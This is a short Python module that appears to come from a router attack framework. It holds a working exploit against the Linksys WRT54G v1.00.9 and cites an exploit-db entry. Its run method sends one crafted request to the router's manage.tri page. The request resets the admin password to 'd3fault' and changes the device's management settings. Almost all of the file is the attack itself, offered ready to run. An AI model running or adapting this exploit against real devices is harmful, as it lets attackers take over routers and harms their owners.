import urllib
import util
from ..router_vuln import RouterVuln

__router__ = 'WRT54G v1.00.9'
__vuln__='Reset Password'
class ResetAdmin(RouterVuln):
	"""Reset admin password
	   http://www.exploit-db.com/exploits/5313/
	"""
	def __init__(self):
		super(ResetAdmin,self).__init__()

	def run(self):
		util.Msg('Resetting admin password to \'d3fault\'...')
		try:
			url = 'http://%s/manage.tri?remote_mg_https=0&http_enable=1&https_enable=0' \
			      '&PasswdModify=1&http_passwd=d3fault&http_passwdConfirm=d3fault' \
			      '&_http_enable=1&web_wl_filter=1&remote_management=0&upnp=_enable=1'\
			      '&layout=en'%self.ip
			response = urllib.urlopen(url).read()
			util.Msg('Done')
		except Exception, e:
			util.Error('Error: %s'%e)
			return
